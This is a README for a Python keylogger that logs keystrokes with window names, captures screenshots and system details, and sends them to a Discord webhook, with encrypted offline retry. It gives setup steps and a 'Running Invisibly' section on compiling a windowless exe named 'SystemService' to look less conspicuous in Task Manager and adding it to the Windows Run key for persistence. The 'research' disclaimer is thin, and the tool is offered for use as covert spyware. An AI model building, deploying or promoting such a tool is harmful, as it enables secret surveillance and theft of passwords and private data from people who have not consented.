# KeyLogger

A modular Python keylogger built for instrumentation and research purposes. Logs keystrokes with active window context, captures periodic screenshots, and reports everything to a Discord Webhook.

---

## Features

- **Keyboard Logging** — Records every keystroke along with the active application/window name
- **Active Window Tracking** — Each log line is labeled with the app the user was typing in
- **Periodic Screenshots** — Captures the screen at a set interval and sends it as a file attachment
- **Discord Webhook Reporter** — Delivers text logs and screenshots directly to a Discord channel
- **Offline Cache** — If Discord is unreachable, logs are saved locally and retried automatically on the next cycle
- **Local Encryption** — The local cache is encrypted using Fernet (AES-128-CBC)
- **System Info on Startup** — Sends hostname, IP, OS, and machine info when the program first runs
- **Graceful Shutdown** — `Ctrl+C` stops all threads cleanly

---

## Project Structure

```
KeyLogger/
├── main.py                  # Entrypoint and orchestrator
├── .env.example             # Configuration template
├── requirements.txt
│
├── collectors/
│   ├── keyboard.py          # Keyboard listener and keystroke formatting
│   ├── window.py            # Active window detection (win32gui / xdotool)
│   └── screen.py            # Screenshot capture via Pillow ImageGrab
│
├── sender/
│   └── discord.py           # Discord Webhook sender (text + file attachment)
│
└── utils/
    ├── crypto.py            # Fernet encrypt/decrypt
    ├── cache.py             # Offline queue and retry logic
    └── system_info.py      # System information collector
```

---

## Setup

### 1. Clone and install dependencies

```bash
git clone https://github.com/username/KeyLogger.git
cd KeyLogger
pip install -r requirements.txt
```

### 2. Configure `.env`

```bash
copy .env.example .env   # Windows
cp .env.example .env     # Linux / macOS
```

Edit the `.env` file:

```env
# Your Discord Webhook URL
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN

# How often to send the text log (in seconds)
LOG_INTERVAL=60

# How often to send a screenshot (in seconds)
SCREENSHOT_INTERVAL=120

# (Optional) Fernet key for local cache encryption
FERNET_KEY=
```

**How to create a Discord Webhook:**
1. Open a Discord channel and click **Edit Channel**
2. Go to **Integrations** > **Webhooks** > **New Webhook**
3. Copy the URL and paste it into `.env`

**Generate a `FERNET_KEY` (optional):**
```bash
python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"
```

### 3. Run

```bash
python main.py
```

To stop: press `Ctrl+C`

---

## Example Discord Output

**System info (on startup)**
```
=== SYSTEM INFO ===
Timestamp         : 2026-10-26 09:45:00
Hostname          : DESKTOP-ABC123
IP Address        : 192.168.1.10
OS                : Windows 11 (10.0.22631)
Machine           : AMD64
Processor         : Intel64 Family 6 ...
===================
```

**Text log (every LOG_INTERVAL seconds)**
```
[09:45:12 | Visual Studio Code] def main():
[09:46:01 | Google Chrome] hello world search query
[09:46:30 | Notepad] some notes typed here
```

**Screenshot** — sent as a file attachment named `screenshot_20261026_094512.png`

---

## How It Works

```
Startup
  |-- Send system info to Discord
  |-- Start keyboard listener   (background thread)
  |-- Start log timer           (every LOG_INTERVAL seconds)
  |-- Start screenshot timer    (every SCREENSHOT_INTERVAL seconds)

Log Timer
  |-- Flush keyboard buffer
  |-- Retry any cached payloads
  |-- Send new log to Discord
        |-- Success: done
        |-- Failure: save to .cache/ (encrypted), retry next cycle

Screenshot Timer
  |-- Capture screen
  |-- Send to Discord as a PNG file attachment
```

---

## Dependencies

| Package | Version | Purpose |
|---|---|---|
| `pynput` | 1.7.7 | Keyboard listener |
| `Pillow` | 11.1.0 | Screenshot via ImageGrab |
| `requests` | 2.31.0 | HTTP requests to Discord Webhook |
| `cryptography` | 42.0.5 | Fernet encryption for local cache |
| `python-dotenv` | 1.0.1 | Load configuration from `.env` |
| `pywin32` | 312 | Active window detection on Windows |

---

## Compatibility

| OS | Status |
|---|---|
| Windows | Full support |
| Linux | Supported (requires `xdotool`) |
| macOS | Not tested |

---

## Running Invisibly (No Console Window)

Use `install.py` to compile the project into a standalone `.exe` with no visible console window.

### Compile only

```bash
python install.py
```

Output: `dist/SystemService.exe` — runs silently in the background with no window.

### Compile and register to Windows startup

```bash
python install.py --startup
```

This adds the `.exe` to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
so it launches automatically every time the user logs in to Windows.

### Remove from startup

```bash
python install.py --uninstall
```

Removes the registry entry. Does not delete the `.exe`.

> **Note:** The `.exe` name defaults to `SystemService` to appear less conspicuous in Task Manager.
> You can change the `APP_NAME` constant at the top of `install.py`.

---

## Disclaimer

This project is intended for research, instrumentation, and educational use on devices you own. Using it on devices or systems you do not own is illegal. Use responsibly.

---
